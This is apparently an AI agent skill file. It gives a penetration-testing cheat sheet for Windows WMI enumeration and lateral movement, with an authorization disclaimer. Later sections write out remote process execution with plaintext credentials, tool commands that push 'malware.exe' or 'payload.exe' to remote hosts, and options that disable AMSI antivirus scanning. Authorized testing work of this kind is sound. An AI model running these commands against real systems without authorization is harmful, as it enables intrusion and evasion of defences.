---
name: wmi-lateral-movement
description: Windows Management Instrumentation (WMI) techniques for authorized security testing and lateral movement assessment. Use this skill whenever you need to enumerate Windows systems, query WMI namespaces/classes, execute remote commands via WMI, or assess WMI-based attack vectors during penetration testing. Trigger this skill for any Windows security assessment involving WMI, remote process execution, system enumeration, or lateral movement testing.
---

# WMI Lateral Movement Assessment

> **Authorization Required**: Only use these techniques on systems you own or have explicit written authorization to test. Unauthorized access is illegal.

## Overview

WMI (Windows Management Instrumentation) provides a powerful interface for remote system management and can be leveraged for lateral movement when credentials are known. This skill covers WMI fundamentals, enumeration techniques, and tool usage for authorized security assessments.

## WMI Fundamentals

### Namespace Structure

WMI uses a directory-style hierarchy with `\root` as the top-level container. Additional directories called namespaces are organized beneath it.

**List root namespaces:**
```powershell
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```

**List classes within a namespace:**
```powershell
gwmi -List -Recurse  # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```

### Classes

Knowing a WMI class name (e.g., `win32_process`) and its namespace is crucial for any WMI operation.

**List classes beginning with `win32`:**
```powershell
Get-WmiObject -Recurse -List -class win32* | more  # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```

**Invoke a class:**
```powershell
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```

### Methods

Methods are executable functions of WMI classes.

**Class loading, method listing, and execution:**
```powershell
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

**Method listing and invocation:**
```powershell
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```

## WMI Enumeration

### Check WMI Service Status

Verify if the WMI service is operational before attempting operations:

```powershell
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```

### System and Process Information

Gather system and process information through WMI:

```powershell
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```

**Comprehensive enumeration with wmic:**
```powershell
wmic computersystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

### Remote WMI Querying

Remote execution over WMI uses the following command structure. A return value of "0" indicates successful execution:

```powershell
wmic /node:hostname /user:user path win32_process call create "command here"
```

**Example - Remote process execution:**
```powershell
wmic /node:target-host /user:admin /password:pass path win32_process call create "whoami"
```

## Automatic Tools

### SharpLateral

[GitHub](https://github.com/mertdas/SharpLateral)

```bash
SharpLateral redwmi HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

### SharpWMI

[GitHub](https://github.com/GhostPack/SharpWMI)

```bash
# Basic execution
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command="C:\temp\process.exe [args]" [amsi=disable] [result=true]

# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```

### SharpMove

[GitHub](https://github.com/0xthirteen/SharpMove)

```bash
# Query remote system
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password

# Create and execute process
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password

# Execute VBS script
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\user password=password
```

### Impacket's wmiexec

Use Impacket's `wmiexec.py` for WMI-based lateral movement:

```bash
python3 wmiexec.py username:password@hostname
```

## Related Tools

**dcomexec.py**: Utilizes different DCOM endpoints to offer a semi-interactive shell, leveraging the ShellBrowserWindow DCOM object. Supports MMC20. Application, Shell Windows, and Shell Browser Window objects.

## Best Practices

1. **Verify WMI service status** before attempting operations
2. **Test connectivity** with simple queries first
3. **Use appropriate credentials** - domain accounts may have broader access
4. **Document findings** for reporting purposes
5. **Respect authorization boundaries** - only test systems you're authorized to assess

## References

- [Using Credentials to Own Windows Boxes - Part 3: WMI and WinRM](https://ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [Beginner's Guide to Impacket Tool Kit](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
